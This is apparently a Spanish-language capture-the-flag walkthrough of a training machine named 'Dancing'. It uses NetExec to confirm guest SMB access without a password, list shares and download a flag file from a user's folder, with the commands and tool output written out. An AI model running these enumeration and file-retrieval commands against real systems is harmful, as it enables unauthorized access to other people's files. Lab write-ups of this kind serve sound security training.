El puerto 139 corre el servicio NetBIOS Session Service que permite compartir recursos. Chequeamos si podemos acceder al servicio sin contraseña.

```bash
nxc smb 10.129.193.219 -u melvin -p ""
```

```plaintext
SMB         10.129.193.219  445    DANCING          [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANCING) (domain:Dancing) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.193.219  445    DANCING          [+] Dancing\melvin: (Guest)
```

`Null Auth:True` indica que podemos conectarnos al servicio sin usuario y contraseña, `melvin` fue reconocido como `Guest`, podemos ingresar cualquier otro usuario que no exista y lo va a tomar `Guest` también.

Como `Guest` podemos enumerar los recursos compartidos.

```bash
nxc smb 10.129.193.219 -u melvin -p "" --shares
```

Vemos que la flag está en un directorio perteneciente al usuario `James.P`, descargamos el archivo.

```bash
nxc smb 10.129.193.219 -u melvin -p "" --share WorkShares --get-file /James.P/flag.txt flag.txt
```
